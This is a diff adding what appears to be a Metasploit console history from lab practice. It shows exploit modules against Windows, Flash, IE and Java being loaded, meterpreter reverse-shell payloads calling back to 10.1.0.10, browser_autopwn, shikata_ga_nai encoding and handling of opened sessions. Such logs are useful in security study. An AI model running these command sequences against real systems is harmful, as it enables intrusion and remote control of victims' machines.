@@ -1,0 +1,180 @@
+use fileformat/ms12_005
+use windows/fileformat/ms12_005
+show options
+set payload_type ruby
+show payloads
+set payload windows/meterpreter/reverse_https
+show options
+set lhost localhost
+set payload windows/messagebox
+show options
+exploit
+set payload_type RUBY
+exploit
+quit
+use windows/browser/adobe_flashplayer_arrayindexing
+show options
+show payloads
+set payload windows/messagebox
+show options
+exploit
+use windows
+use windows/ms0115
+quit
+use exploits/windows/browser/ms11_050_mshtml_cobjectelement
+use windows/browser/ms11_050_mshtml_cobjectelement
+set payload windows/messagebox
+show options
+exploit
+quit
+use windows/browser/ms11_050_mshtml_cobjectelement
+set payload windows/messagebox
+exploit
+quit
+use auxiliary/server/browser_autopwn
+set payload windows/messagebox
+show options
+set lhost 10.1.0.10
+exploit
+exploit
+quit
+use auxiliary/server/browser_autopwn 
+show options
+set lhost 10.1.0.10
+exploit 
+sessions -l
+sessions
+sessions 1
+sessions -j 1
+help sessions
+sessions -i 1
+sessions
+quit
+quit
+quit
+use multi/handler
+set payload windows/x86/meterpreter
+set payload windows/shell/meterpreter
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.1.0.10
+exploit
+exit
+exit
+exit
+show encoders
+set encoder x86/shikata_ga_nai
+show advanced
+set encoder x86/shikata_ga_nai -c 5
+exploit
+set encoder x86/shikata_ga_nai 
+exploit
+help
+loot
+jobs
+kill 0
+rexploit
+kill 0
+kill 1
+jobs
+kill 2
+quit
+exit
+jobs
+exit
+jobs
+quit
+jobs
+kill 0
+exit
+jobs
+kill 0
+exit
+jobs
+kill 0
+exit
+sessions -l
+sessions -i 1
+jobs
+help
+sessions
+rexploit
+kill 0
+jobs
+rexploit
+exploit -j
+jobs
+kill 1
+exit
+exit
+exit
+sessions -i 1
+quit
+load nmap
+set lhost 10.1.0.10
+exploit
+rexploit
+sessions
+show options
+quit
+sessions -i 1
+sessions
+sessions
+sessions -i 1
+sessions -l
+sessions -l
+sessions
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.1.0.10
+exploit
+jobs
+sessions
+info 0
+help jobs
+jobs -v -i 0
+sessions
+info java
+search java
+search applet
+use windows/browser/java_codebase_trust
+show options
+set payload windows/meterepreter_reverse_tcp
+set payload windows/meterpreter_reverse_tcp
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.1.0.10
+exploit
+unset payload
+exploit
+jobs
+kill 0
+exploit
+search applet
+use multi/browser/java_signed_applet
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.1.0.10
+set lport 5555
+exploit
+sessions
+sessions -i 2
+sessions -l
+sessions -l
+jobs
+help
+jobs
+info 2
+jobs 2
+show potions
+show -h
+show evasion
+show options
+sessions -i 3
+search post
+sessions -i 3
+sessions -i
+sessions -l
+search dope
+search dope
+quit
+exit -y
+search dope
+quit
